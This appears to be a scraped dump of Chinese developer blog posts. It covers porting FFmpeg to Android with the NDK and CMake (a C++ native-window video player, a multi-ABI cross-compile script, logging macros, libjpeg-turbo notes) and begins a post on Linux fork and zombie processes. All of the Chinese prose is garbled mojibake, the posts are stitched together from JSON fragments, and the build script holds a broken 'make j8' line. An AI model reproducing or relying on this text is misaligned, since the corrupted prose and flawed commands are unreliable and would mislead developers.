æƒ³è¦æ”¯æŒçš„æ¶æ„å¯¹åº”çš„soæ–‡ä»¶ï¼ˆåœ¨Linuxä¸Šç¼–å‡ºæ¥çš„ï¼‰ add_library( avcodec SHARED IMPORTED) set_target_properties( avcodec PROPERTIES IMPORTED_LOCATION ${distribution_DIR}/${ANDROID_ABI}/libavcodec.so) //æœ€ç»ˆgradleç¼–è¯‘çš„æ—¶å€™ä¼šæŠŠabiFilterä¸­æŒ‡å®šçš„cpuæ¶æ„ä¸€ä¸ªä¸ªå»å¯¹åº”çš„æ–‡ä»¶å¤¹å»æ‰¾soæ–‡ä»¶ï¼Œæ‰¾ä¸åˆ°å°±ä¼šæŠ¥é”™ include_directories( avcodec/include/ ) //å‘Šè¯‰cmakeï¼ŒæŠŠè¿™ä¸ªç›®å½•ä¸‹é¢çš„æ–‡ä»¶å½“åšå¤´æ–‡ä»¶æ‹¿è¿›æ¥ï¼Œä¸ç”¨è‡ªå·±ä¸€ä¸ªä¸ªå»copyäº†ï¼Œæ³¨æ„è¿™ä¸ªä¸æ˜¯recursiveçš„ï¼Œä¹Ÿå°±æ˜¯ç…§é¡¾ä¸åˆ°å­æ–‡ä»¶å¤¹ //è¿™ä¸€æ­¥å°±æ˜¯Linkäº† target_link_libraries( native-lib //è¿™ä¸ªæ˜¯æˆ‘ä»¬è‡ªå·±çš„libçš„åå­— avcodec avfilter avformat avutil swresample swscale -landroid ${log-lib} ) é¢„å…ˆç¼–è¯‘å¥½çš„soæ–‡ä»¶æ”¾ç½®çš„ç›®å½•è¦å‘Šè¯‰gradle f you want Gradle to package prebuilt native libraries with your APK, modify the default source set configuration to include the directory of your prebuilt .so files, as shown below. Keep in mind, you donâ€™t need to do this to include artifacts of CMake build scripts that you link to Gradle. android { ... sourceSets { main { jniLibs.srcDirs &#39;imported-lib/src/&#39;, &#39;more-imported-libs/src/&#39; } } } è°ƒç”¨ndkçš„apiæ¯”æ–¹è¯´è¿™ç§å¤´æ–‡ä»¶ #include &lt;android/native_window_jni.h&gt; #include &lt;android/cpu-features.h&gt; #include &lt;android/multinetwork.h&gt; native_window_jni åœ¨ndk çš„libandroid.soåº“ä¸­ï¼Œéœ€è¦åœ¨CMakeLists.txtä¸­å¼•å…¥androidåº“ï¼Œåƒè¿™æ · target_link_libraries( my-lib ... -landroid ${log-lib} ) ä»fmpeg+native_windowå®ç°ä¸‡èƒ½è§†é¢‘æ’­æ”¾å™¨æ’­æ”¾æœ¬åœ°è§†é¢‘æŠ„æ¥ä¸€æ®µcppä»£ç  extern &quot;C&quot; { //ç¼–ç  #include &quot;libavcodec/avcodec.h&quot; //å°è£…æ ¼å¼å¤„ç† #include &quot;libavformat/avformat.h&quot; //åƒç´ å¤„ç† #include &quot;libswscale/swscale.h&quot; //native_window_jni åœ¨ndk çš„libandroid.soåº“ä¸­ï¼Œéœ€è¦åœ¨CMakeLists.txtä¸­å¼•å…¥androidåº“ #include &lt;android/native_window_jni.h&gt; #include &lt;unistd.h&gt;//sleepç”¨çš„å¤´æ–‡ä»¶ } /** *å°†ä»»æ„æ ¼å¼çš„è§†é¢‘åœ¨æ‰‹æœºä¸Šè¿›è¡Œæ’­æ”¾ï¼Œä½¿ç”¨nativeè¿›è¡Œç»˜åˆ¶ * env:è™šæ‹ŸæœºæŒ‡é’ˆ * inputStrï¼šè§†é¢‘æ–‡ä»¶è·¯å¾„ * surface: ä»javaå±‚ä¼ é€’è¿‡æ¥çš„SurfaceViewçš„surfaceå¯¹è±¡ */ void ffmpegVideoPlayer(JNIEnv *env, char *inputStr, jobject surface) { // 1.æ³¨å†Œå„å¤§ç»„ä»¶ï¼Œæ‰§è¡Œffmgpeéƒ½å¿…é¡»è°ƒç”¨æ­¤å‡½æ•° av_register_all(); //2.å¾—åˆ°ä¸€ä¸ªffmpegçš„ä¸Šä¸‹æ–‡ï¼ˆä¸Šä¸‹æ–‡é‡Œé¢å°è£…äº†è§†é¢‘çš„æ¯”ç‰¹ç‡ï¼Œåˆ†è¾¨ç‡ç­‰ç­‰ä¿¡æ¯...éå¸¸é‡è¦ï¼‰ AVFormatContext *pContext = avformat_alloc_context(); //3.æ‰“å¼€ä¸€ä¸ªè§†é¢‘ if (avformat_open_input(&amp;pContext, inputStr, NULL, NULL) &lt; 0) { LOGE(&quot;æ‰“å¼€å¤±è´¥&quot;); return; } //4.è·å–è§†é¢‘ä¿¡æ¯ï¼ˆå°†è§†é¢‘ä¿¡æ¯å°è£…åˆ°ä¸Šä¸‹æ–‡ä¸­ï¼‰ if (avformat_find_stream_info(pContext, NULL) &lt; 0) { LOGE(&quot;è·å–ä¿¡æ¯å¤±è´¥&quot;); return; } //5.ç”¨æ¥è®°ä½è§†é¢‘æµçš„ç´¢å¼• int video_stream_idx = -1; //ä»ä¸Šä¸‹æ–‡ä¸­å¯»æ‰¾æ‰¾åˆ°è§†é¢‘æµ for (int i = 0; i &lt; pContext-&gt;nb_streams; ++i) { LOGE(&quot;å¾ªç¯ %d&quot;, i); //codecï¼šæ¯ä¸€ä¸ªæµ å¯¹åº”çš„è§£ç ä¸Šä¸‹æ–‡ //codec_typeï¼šæµçš„ç±»å‹ if (pContext-&gt;streams[i]-&gt;codec-&gt;codec_type == AVMEDIA_TYPE_VIDEO) { //å¦‚æœæ‰¾åˆ°çš„æµç±»å‹ == AVMEDIA_TYPE_VIDEO å³è§†é¢‘æµï¼Œå°±å°†å…¶ç´¢å¼•ä¿å­˜ä¸‹æ¥ video_stream_idx = i; } } //è·å–åˆ°è§£ç å™¨ä¸Šä¸‹æ–‡ AVCodecContext *pCodecCtx = pContext-&gt;streams[video_stream_idx]-&gt;codec; //è·å–è§£ç å™¨ï¼ˆåŠ å¯†è§†é¢‘å°±æ˜¯åœ¨æ­¤å¤„æ— æ³•è·å–ï¼‰ AVCodec *pCodex = avcodec_find_decoder(pCodecCtx-&gt;codec_id); LOGE(&quot;è·å–è§†é¢‘ç¼–ç  %p&quot;, pCodex); //6.æ‰“å¼€è§£ç å™¨ã€‚ ï¼ˆffempgç‰ˆæœ¬å‡çº§åå­—å«åšavcodec_open2ï¼‰ if (avcodec_open2(pCodecCtx, pCodex, NULL) &lt; 0) { LOGE(&quot;è§£ç å¤±è´¥&quot;); return; } //----------------------è§£ç å‰å‡†å¤‡-------------------------------------- //å‡†å¤‡å¼€å§‹è§£ç æ—¶éœ€è¦ä¸€ä¸ªAVPacketå­˜å‚¨æ•°æ®ï¼ˆé€šè¿‡av_mallocåˆ†é…å†…å­˜ï¼‰ AVPacket *packet = (AVPacket *) av_malloc(sizeof(AVPacket)); av_init_packet(packet);//åˆå§‹åŒ–ç»“æ„ä½“ //è§£å°è£…éœ€è¦AVFrame AVFrame *frame = av_frame_alloc(); //å£°æ˜ä¸€ä¸ªrgb_Frameçš„ç¼“å†²åŒº AVFrame *rgb_Frame = av_frame_alloc(); //rgb_Frame çš„ç¼“å†²åŒº åˆå§‹åŒ– uint8_t *out_buffer = (uint8_t *) av_malloc( avpicture_get_size(AV_PIX_FMT_RGBA, pCodecCtx-&gt;width, pCodecCtx-&gt;height)); //ç»™ç¼“å†²åŒºè¿›è¡Œæ›¿æ¢ int re = avpicture_fill((AVPicture *) rgb_Frame, out_buffer, AV_PIX_FMT_RGBA, pCodecCtx-&gt;width, pCodecCtx-&gt;height); LOGE(&quot;å®½ %d é«˜ %d&quot;, pCodecCtx-&gt;width, pCodecCtx-&gt;height); //æ ¼å¼è½¬ç éœ€è¦çš„è½¬æ¢ä¸Šä¸‹æ–‡ï¼ˆæ ¹æ®å°è£…æ ¼å¼çš„å®½é«˜å’Œç¼–ç æ ¼å¼ï¼Œä»¥åŠéœ€è¦å¾—åˆ°çš„æ ¼å¼çš„å®½é«˜ï¼‰ //pCodecCtx-&gt;pix_fmt å°è£…æ ¼å¼æ–‡ä»¶çš„ä¸Šä¸‹æ–‡ //AV_PIX_FMT_RGBA ï¼š ç›®æ ‡æ ¼å¼ éœ€è¦è·ŸSurfaceViewè®¾å®šçš„æ ¼å¼ç›¸åŒ //SWS_BICUBIC ï¼šæ¸…æ™°åº¦ç¨å¾®ä½ä¸€ç‚¹çš„ç®—æ³•ï¼ˆè½¬æ¢ç®—æ³•ï¼Œå‰é¢çš„ç®—æ³•æ¸…æ™°åº¦é«˜æ•ˆç‡ä½ï¼Œä¸‹é¢çš„ç®—æ³•æ¸…æ™°åº¦ä½æ•ˆç‡é«˜ï¼‰ //NULL,NULL,NULL ï¼š è¿‡æ»¤å™¨ç­‰ SwsContext *swsContext = sws_getContext(pCodecCtx-&gt;width, pCodecCtx-&gt;height, pCodecCtx-&gt;pix_fmt, pCodecCtx-&gt;width, pCodecCtx-&gt;height, AV_PIX_FMT_RGBA, SWS_BICUBIC, NULL, NULL, NULL ); int frameCount = 0; //è·å–nativeWindowå¯¹è±¡,å‡†å¤‡è¿›è¡Œç»˜åˆ¶ ANativeWindow *nativeWindow = ANativeWindow_fromSurface(env, surface); ANativeWindow_Buffer outBuffer;//ç”³æ˜ä¸€å—ç¼“å†²åŒº ç”¨äºç»˜åˆ¶ //------------------------ä¸€æ¡¢ä¸€å¸§å¼€å§‹è§£ç -------------------- int length = 0; int got_frame; while (av_read_frame(pContext, packet) &gt;= 0) {//å¼€å§‹è¯»æ¯ä¸€å¸§çš„æ•°æ® if (packet-&gt;stream_index == video_stream_idx) {//å¦‚æœè¿™æ˜¯ä¸€ä¸ªè§†é¢‘æµ //7.è§£å°è£…ï¼ˆå°†packetè§£å‹ç»™frameï¼Œå³ï¼šæ‹¿åˆ°äº†è§†é¢‘æ•°æ®frameï¼‰ length = avcodec_decode_video2(pCodecCtx, frame, &amp;got_frame, packet);//è§£å°è£…å‡½æ•° LOGE(&quot; è·å¾—é•¿åº¦ %d è§£ç %d &quot;, length, frameCount++); if (got_frame &gt; 0) { //8.å‡†å¤‡ç»˜åˆ¶ //é…ç½®ç»˜åˆ¶ä¿¡æ¯ å®½é«˜ æ ¼å¼(è¿™ä¸ªç»˜åˆ¶çš„å®½é«˜ç›´æ¥å†³å®šäº†è§†é¢‘åœ¨å±å¹•ä¸Šæ˜¾ç¤ºçš„æƒ…å†µï¼Œè¿™æ ·ä¼šå¹³é“ºæ•´ä¸ªå±å¹•ï¼Œå¯ä»¥æ ¹æ®ç‰¹å®šçš„å±å¹•åˆ†è¾¨ç‡å’Œè§†é¢‘å®½é«˜è¿›è¡ŒåŒ¹é…) ANativeWindow_setBuffersGeometry(nativeWindow, pCodecCtx-&gt;width, pCodecCtx-&gt;height, WINDOW_FORMAT_RGBA_8888); ANativeWindow_lock(nativeWindow, &amp;outBuffer, NULL);//é”å®šç”»å¸ƒ(outBufferä¸­å°†ä¼šå¾—åˆ°æ•°æ®) //9.è½¬ç ï¼ˆè½¬ç ä¸Šä¸‹æ–‡ï¼ŒåŸæ•°æ®ï¼Œä¸€è¡Œæ•°æ®ï¼Œå¼€å§‹ä½ç½®ï¼Œyuvçš„ç¼“å†²æ•°ç»„ï¼Œyuvä¸€è¡Œçš„æ•°æ®ï¼‰ sws_scale(swsContext, (const uint8_t *const *) frame-&gt;data, frame-&gt;linesize, 0, frame-&gt;height, rgb_Frame-&gt;data, rgb_Frame-&gt;linesize ); //10.ç»˜åˆ¶ uint8_t *dst = (uint8_t *) outBuffer.bits; //å®é™…çš„ä½æ•° int destStride = outBuffer.stride * 4; //æ‹¿åˆ°ä¸€è¡Œæœ‰å¤šå°‘ä¸ªå­—èŠ‚ RGBA uint8_t *src = (uint8_t *) rgb_Frame-&gt;data[0];//åƒç´ æ•°æ®çš„é¦–åœ°å€ int srcStride = rgb_Frame-&gt;linesize[0]; //å®é™…å†…å­˜ä¸€è¡Œçš„æ•°é‡ for (int i = 0; i &lt; pCodecCtx-&gt;height; ++i) { //å°†rgb_Frameç¼“å†²åŒºé‡Œé¢çš„æ•°æ®ä¸€è¡Œä¸€è¡Œcopyåˆ°windowçš„ç¼“å†²åŒºé‡Œé¢ //copyåˆ°windowç¼“å†²åŒºçš„æ—¶å€™è¿›è¡Œä¸€äº›åç§»è®¾ç½®å¯ä»¥å°†è§†é¢‘æ’­æ”¾å±…ä¸­ memcpy(dst + i * destStride, src + i * srcStride, srcStride); } ANativeWindow_unlockAndPost(nativeWindow);//è§£é”ç”»å¸ƒ usleep(1000 * 16);//å¯ä»¥æ ¹æ®å¸§ç‡ä¼‘çœ 16ms } } av_free_packet(packet);//é‡Šæ”¾ } ANativeWindow_release(nativeWindow);//é‡Šæ”¾window av_frame_free(&amp;frame); av_frame_free(&amp;rgb_Frame); avcodec_close(pCodecCtx); avformat_free_context(pContext); free(inputStr); } ffmpegç§»æ¤åˆ°Androidä¸Šï¼ˆå¤šä¸ªabiï¼‰é¦–å…ˆæ˜¯ç¼–è¯‘ä¸åŒæ¶æ„çš„ffmpeg libraryè¿™ä¸ªåº“ä½¿ç”¨äº†FFmpeg 3.4 å’Œ NDK r16b stable. ç‰ˆæœ¬æ­é…çœŸçš„å¾ˆé‡è¦ï¼Œè¿™ä¸ªè„šæœ¬è¿˜è¦è°ƒç”¨pythonåˆ›å»ºä¸åŒabiçš„toolchainã€‚ä½¿ç”¨ndkç¼–è¯‘ffmpegæ»¡æ»¡çš„éƒ½æ˜¯å‘ In file included from libavfilter/aeval.c:26:0: ./libavutil/avassert.h:30:20: fatal error: stdlib.h: No such file or directory #include &lt;stdlib.h&gt; ^ å‡ºç°è¿™ä¸ªé”™è¯¯æ˜¯å› ä¸ºä½¿ç”¨æœ€æ–°ç‰ˆçš„NDKé€ æˆçš„ï¼Œæœ€æ–°ç‰ˆçš„NDkå°†å¤´æ–‡ä»¶å’Œåº“æ–‡ä»¶è¿›è¡Œäº†åˆ†ç¦»ï¼Œæˆ‘ä»¬æŒ‡å®šçš„sysrootæ–‡ä»¶å¤¹ä¸‹åªæœ‰åº“æ–‡ä»¶ï¼Œè€Œå¤´æ–‡ä»¶æ”¾åœ¨äº†NDKç›®å½•ä¸‹çš„sysrootå†…ï¼Œåªéœ€åœ¨--extra-cflagsä¸­æ·»åŠ  &quot;-isysroot $NDK/sysroot&quot; å³å¯ï¼Œè¿˜æœ‰æœ‰å…³æ±‡ç¼–çš„å¤´æ–‡ä»¶ä¹Ÿè¿›è¡Œäº†åˆ†ç¦»ï¼Œéœ€è¦æ ¹æ®ç›®æ ‡å¹³å°è¿›è¡ŒæŒ‡å®š &quot;-I$NDK/sysroot/usr/include/arm-linux-androideabi&quot;ï¼Œå°† &quot;arm-linux-androideabi&quot; æ”¹ä¸ºéœ€è¦çš„å¹³å°å°±å¯ä»¥ï¼Œç»ˆäºå¯ä»¥é¡ºåˆ©çš„è¿›è¡Œç¼–è¯‘äº† nasm/yasm not found or too old. use --disable-x86asm for a crippled build è¿™æ˜¯æ±‡ç¼–å·¥å…·æ²¡æœ‰å®‰è£…å¯¼è‡´çš„sudo apt install yasm æ‰¾åˆ°ä¸€ä¸ªç¼–è¯‘ä¸åŒabiçš„soæ–‡ä»¶çš„è„šæœ¬armeabi-v7a arm64-v8a x86 x86_64è¿™ä¹ˆå‡ ä¸ªhostæ¯ä¸ªéƒ½è¦èŠ±ä¸Š10åˆ†é’Ÿï¼Œæ‰€ä»¥è¿™ä¸ªè„šæœ¬è·‘èµ·æ¥ä¹‹åå¯ä»¥å»å–æ¯èŒ¶äº† #!/bin/sh PREFIX=android-build HOST_PLATFORM=linux-x86_64 COMMON_OPTIONS=&quot;\\ --target-os=android \\ --disable-static \\ --enable-shared \\ --enable-small \\ --disable-programs \\ --disable-ffmpeg \\ --disable-ffplay \\ --disable-ffprobe \\ --disable-doc \\ --disable-symver \\ --disable-asm \\ --enable-decoder=vorbis \\ --enable-decoder=opus \\ --enable-decoder=flac &quot; build_all(){ for version in armeabi-v7a arm64-v8a x86 x86_64; do echo &quot;======== &gt; Start build $version&quot; case ${version} in armeabi-v7a ) ARCH=&quot;arm&quot; CPU=&quot;armv7-a&quot; CROSS_PREFIX=&quot;$NDK_HOME/toolchains/arm-linux-androideabi-4.9/prebuilt/$HOST_PLATFORM/bin/arm-linux-androideabi-&quot; SYSROOT=&quot;$NDK_HOME/platforms/android-21/arch-arm/&quot; EXTRA_CFLAGS=&quot;-march=armv7-a -mfpu=neon -mfloat-abi=softfp -mvectorize-with-neon-quad&quot; EXTRA_LDFLAGS=&quot;-Wl,--fix-cortex-a8&quot; ;; arm64-v8a ) ARCH=&quot;aarch64&quot; CPU=&quot;armv8-a&quot; CROSS_PREFIX=&quot;$NDK_HOME/toolchains/aarch64-linux-android-4.9/prebuilt/$HOST_PLATFORM/bin/aarch64-linux-android-&quot; SYSROOT=&quot;$NDK_HOME/platforms/android-21/arch-arm64/&quot; EXTRA_CFLAGS=&quot;&quot; EXTRA_LDFLAGS=&quot;&quot; ;; x86 ) ARCH=&quot;x86&quot; CPU=&quot;i686&quot; CROSS_PREFIX=&quot;$NDK_HOME/toolchains/x86-4.9/prebuilt/$HOST_PLATFORM/bin/i686-linux-android-&quot; SYSROOT=&quot;$NDK_HOME/platforms/android-21/arch-x86/&quot; EXTRA_CFLAGS=&quot;&quot; EXTRA_LDFLAGS=&quot;&quot; ;; x86_64 ) ARCH=&quot;x86_64&quot; CPU=&quot;x86_64&quot; CROSS_PREFIX=&quot;$NDK_HOME/toolchains/x86_64-4.9/prebuilt/$HOST_PLATFORM/bin/x86_64-linux-android-&quot; SYSROOT=&quot;$NDK_HOME/platforms/android-21/arch-x86_64/&quot; EXTRA_CFLAGS=&quot;&quot; EXTRA_LDFLAGS=&quot;&quot; ;; esac echo &quot;-------- &gt; Start clean workspace&quot; make clean echo &quot;-------- &gt; Start config makefile&quot; configuration=&quot;\\ --prefix=${PREFIX} \\ --libdir=${PREFIX}/libs/${version} --incdir=${PREFIX}/includes/${version} \\ --pkgconfigdir=${PREFIX}/pkgconfig/${version} \\ --arch=${ARCH} \\ --cpu=${CPU} \\ --cross-prefix=${CROSS_PREFIX} \\ --sysroot=${SYSROOT} \\ --extra-ldexeflags=-pie \\ ${COMMON_OPTIONS} &quot; echo &quot;-------- &gt; Start config makefile with ${configuration}&quot; ./configure ${configuration} echo &quot;-------- &gt; Start make ${version} with -j8&quot; make j8 echo &quot;-------- &gt; Start install ${version}&quot; make install echo &quot;++++++++ &gt; make and install ${version} complete.&quot; done } echo &quot;-------- Start --------&quot; build_all echo &quot;-------- End --------&quot; å¦‚ä½•æŠŠffmpegç”Ÿæˆçš„soæ–‡ä»¶å‹ç¼©å¤§å° ç„¶åæ‰æ˜¯äº¤å‰ç¼–è¯‘ androidä¸åŒäºPCç«¯ï¼Œandroidæ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ã€æ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰éƒ½è¢«é‡å®šå‘åˆ°äº†/dev/nullï¼Œprintf ï¼Œstd::coutå‡½æ•°æ ¹æœ¬ä¸èµ·ä½œç”¨ã€‚æ‰€ä»¥ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨è¿™ç§æ–¹å¼ #include &lt;android/log.h&gt; #define LOG_TAG &quot;native-glue&quot; #define LOGI(...) ((void)__android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)) #define LOGD(...) ((void)__android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)) #define LOGW(...) ((void)__android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)) #define LOGE(...) ((void)__android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)) libjpegç§»æ¤åˆ°androidä¸Šçš„æ•™ç¨‹ä¸è¦å¤ªç®€å•å‚è€ƒè¿™ç¯‡æ–‡ç« çš„åšæ³• é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­å‘ç°Androidçš„è´¨é‡å‹ç¼©ç®—æ³•åœ¨å›¾ç‰‡è¿‡å¤§ï¼Œè‰²å½©ä¸°å¯Œçš„å‰æä¸‹ï¼Œå‹ç¼©çš„æ€§èƒ½ä¸æ˜¯ç‰¹åˆ«å¥½ï¼Œç»è¿‡è°ƒæŸ¥å‘ç°Androidåº•å±‚å®ç°ä½¿ç”¨Skiaå¼•æ“ï¼Œå°è£…äº†äº†libjpegå›¾åƒåº“ã€‚ä¸ºäº†é€‚é…ä½ç‰ˆæœ¬çš„Androidæ‰‹æœºï¼Œå…¶å†…éƒ¨çš„å‹ç¼©ç®—æ³•å¹¶æ²¡æœ‰é‡‡ç”¨æ™®éçš„å“ˆå¤«æ›¼ç®—æ³•ï¼Œå› ä¸ºå“ˆå¤«æ›¼ç®—æ³•æ¯”è¾ƒå CPUï¼Œä»è€Œé€‰æ‹©äº†å…¶ä»–çš„ç®—æ³•Bï¼Œè€Œç®—æ³•Bçš„æ•ˆæœå¹¶æ²¡æœ‰è¾¾åˆ°é¡¹ç›®é¢„æœŸï¼Œæ‰€ä»¥è¿™é‡Œç ”ç©¶ä¸€ä¸‹é€šè¿‡è‡ªç¼–è¯‘libjpegæ¥ä½¿ç”¨å“ˆå¤«æ›¼ç®—æ³•è¿›è¡Œå›¾ç‰‡å‹ç¼©çš„æ“ä½œã€‚ å›¾ç‰‡åœ¨å†…å­˜ä¸­å ç”¨çš„å¤§å°ä¸º3mï¼ŒåŒç­‰å‹ç¼©è´¨é‡ä¸‹, æºç”ŸèŠ±äº†215æ¯«ç§’ï¼Œè€Œlibjpeg-turboèŠ±äº†1.6ç§’ã€‚ libjpeg-turboä»“åº“ç›´æ¥æŠŠæ‰€æœ‰æ–‡ä»¶ç²˜è´´åˆ°é¡¹ç›®ä¸­ï¼Œbuild.gradleä¸­æŒ‡å®šCMakeLists.txtå¯¹åº”çš„è·¯å¾„ã€‚ä¼šç”Ÿæˆlibjepg.soå’Œlibturbo-jpeg.soä¸¤ä¸ªæ–‡ä»¶ã€‚ å‚è€ƒconfigure-cmakegooglesamples/android-ndkAndroid NDKå¼€å‘æ‰«ç›²åŠæœ€æ–°CMakeçš„ç¼–è¯‘ä½¿ç”¨ANDROID_ABIè¿™ä¸ªå˜é‡ï¼Œåœ¨CMakeLists.txté‡Œé¢ï¼Œå¯ä»¥å‘Šè¯‰æˆ‘ä»¬å½“å‰æ‰“çš„æ˜¯x86è¿˜æ˜¯arm64-v8a","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"Cè¯­è¨€ä¸­å¤šè¿›ç¨‹ä¹‹é—´é€šä¿¡çš„æ–¹å¼","date":"2019-01-30T07:57:28.000Z","path":"2019/01/30/2019-01-30-ipc-in-c-programming-language/","text":"è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„æœ€å°å•ä½ï¼Œçº¿ç¨‹æ˜¯CPUè°ƒåº¦çš„æœ€å°å•ä½ æœ¬æ–‡å¤šæ•°æ¥è‡ªcè¯­è¨€å¤šè¿›ç¨‹ç¼–ç¨‹ å½“Linuxå¯åŠ¨çš„æ—¶å€™ï¼Œinitæ˜¯ç³»ç»Ÿåˆ›å»ºçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™ä¸€è¿›ç¨‹ä¼šä¸€ç›´å­˜åœ¨ï¼Œç›´åˆ°æˆ‘ä»¬å…³é—­è®¡ç®—æœºï¼›è™½ç„¶åé¢systemdå–ä»£äº†initè¿›ç¨‹ã€‚åé¢çš„æ‰€æœ‰è¿›ç¨‹éƒ½æ˜¯initè¿›ç¨‹forkå‡ºæ¥çš„,linuxä¸‹ä½¿ç”¨pstreeå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„è¿›ç¨‹éƒ½æ˜¯ä»¥systemdä¸ºæ ¹èŠ‚ç‚¹çš„å½“è¿›ç¨‹è°ƒç”¨forkçš„æ—¶å€™ï¼ŒLinuxåœ¨å†…å­˜ä¸­å¼€è¾Ÿå‡ºä¸€ç‰‡æ–°çš„å†…å­˜ç©ºé—´ç»™æ–°çš„è¿›ç¨‹ï¼Œå¹¶å°†è€çš„è¿›ç¨‹ç©ºé—´ä¸­çš„å†…å®¹å¤åˆ¶åˆ°æ–°çš„ç©ºé—´ä¸­ï¼Œæ­¤åä¸¤ä¸ªè¿›ç¨‹åŒæ—¶è¿è¡Œï¼›è€è¿›ç¨‹æˆä¸ºæ–°è¿›ç¨‹çš„çˆ¶è¿›ç¨‹(parent process)ï¼Œè€Œç›¸åº”çš„ï¼Œæ–°è¿›ç¨‹å°±æ˜¯è€è¿›ç¨‹çš„å­è¿›ç¨‹(child process)ï¼› forkçš„æœ€ç®€å•å®ä¾‹forkæ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œä¼šæœ‰ä¸¤æ¬¡è¿”å›ï¼Œåˆ†åˆ«æ˜¯çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ã€‚ #include &lt;stdint.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; void print_process_message(){ __pid_t myprocess_id = getpid(); __uid_t uid = getuid(); __gid_t ugid = getgid(); printf(&quot;getpid = %d getuid= %d getgid= %d \\n&quot;,myprocess_id,uid, ugid); } int main(int argc, char const *argv[]) { int n =0; printf(&quot;before fork: n = %d\\n&quot;,n); __pid_t fpid =fork(); if(fpid &lt;0 ) { perror(&quot;fork error&quot;); exit(EXIT_FAILURE); }else if (fpid == 0) { n++; printf(&quot;child_proc(%d, ppid=%d): n= %d\\n&quot;,getpid(),getppid(),n); } else { n--; printf(&quot;parent_proc(%d): n= %d\\n&quot;,getpid(),n); } print_process_message(); printf(&quot;quit_proc(%d) ...\\n&quot;,getpid()); return 0; } forkå’Œvfrokforkåˆ›å»ºå­è¿›ç¨‹ï¼ŒæŠŠçˆ¶è¿›ç¨‹æ•°æ®ç©ºé—´ã€å †å’Œæ ˆå¤åˆ¶ä¸€ä»½ï¼›vforkåˆ›å»ºå­è¿›ç¨‹ï¼Œä¸çˆ¶è¿›ç¨‹å†…å­˜æ•°æ®å…±äº«ï¼›ä½†æ˜¯åæ¥çš„forkä¹Ÿå­¦èªæ˜äº†ï¼Œä¸æ˜¯ä¸€å¼€å§‹è°ƒç”¨forkå°±å¤åˆ¶æ•°æ®ï¼Œè€Œæ˜¯åªæœ‰åœ¨å­è¿›ç¨‹è¦ä¿®æ”¹æ•°æ®çš„æ—¶å€™ï¼Œæ‰è¿›è¡Œå¤åˆ¶ï¼Œå³copy-on-writeï¼›æ‰€ä»¥æˆ‘ä»¬ç°åœ¨ä¹Ÿå¾ˆå°‘å»ç”¨vforkï¼Œå› ä¸ºvforkçš„ä¼˜åŠ¿å·²ç»ä¸å¤å­˜åœ¨äº†ï¼› å­¤å„¿è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹ä»¥åŠwaitæ­£å¸¸çš„æ“ä½œæµç¨‹ï¼šå­è¿›ç¨‹ç»ˆç»“æ—¶ä¼šé€šçŸ¥çˆ¶è¿›ç¨‹ï¼Œå¹¶é€šè¿‡return codeå‘Šè¯‰å†…æ ¸è‡ªå·±çš„é€€å‡ºä¿¡æ¯ï¼Œçˆ¶è¿›ç¨‹çŸ¥é“åï¼Œæœ‰è´£ä»»å¯¹è¯¥å­è¿›ç¨‹ä½¿ç”¨waitç³»ç»Ÿè°ƒç”¨ï¼Œè¿™ä¸ªwaitå‡½æ•°èƒ½å¤Ÿä»å†…æ ¸ä¸­å–å‡ºå­è¿›ç¨‹çš„é€€å‡ºä¿¡æ¯ï¼Œå¹¶æ¸…ç©ºè¯¥ä¿¡æ¯åœ¨å†…æ ¸ä¸­æ‰€å æ®çš„ç©ºé—´ï¼› ä¸æ­£å¸¸çš„æµç¨‹ï¼šçˆ¶è¿›ç¨‹æ—©äºå­è¿›ç¨‹æŒ‚æ‰ï¼Œé‚£ä¹ˆå­è¿›ç¨‹å°±æˆäº†å­¤å„¿è¿›ç¨‹ å¦‚æœç¨‹åºå†™çš„ç³Ÿç³•ï¼Œçˆ¶è¿›ç¨‹å¿˜è®°å¯¹å­è¿›ç¨‹è°ƒç”¨waitï¼Œå­è¿›ç¨‹å°±æˆä¸ºåƒµå°¸(zombie)è¿›ç¨‹ã€‚ï¼ˆåœ¨htopé‡Œé¢çœ‹åˆ°stateæ˜¯Zï¼‰å½“è¿›ç¨‹é€€å‡ºï¼Œé‡Šæ”¾å¤§å¤šæ•°èµ„æºå’Œå®ƒçš„çˆ¶è¿›ç¨‹æ”¶é›†å®ƒçš„è¿”å›å€¼ã€é‡Šæ”¾å‰©ä½™èµ„æºè¿™ä¸¤æ®µæ—¶é—´ä¹‹é—´ï¼Œå­è¿›ç¨‹å¤„äºä¸€ä¸ªç‰¹æ®ŠçŠ¶æ€ï¼Œè¢«ç§°ä¸ºåƒµå°¸è¿›ç¨‹ï¼›æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šç»è¿‡ä¸€ä¸ªçŸ­æš‚çš„åƒµå°¸çŠ¶æ€ï¼Œåƒµå°¸è¿›ç¨‹çš„æœ€å¤§å±å®³å°±æ˜¯ä¼šå ç”¨å®è´µçš„PIDèµ„æºï¼Œå¦‚æœä¸åŠæ—¶æ¸…ç†ï¼Œä¼šå¯¼è‡´æ— æ³•å†åˆ›å»ºæ–°çš„è¿›ç¨‹ï¼› 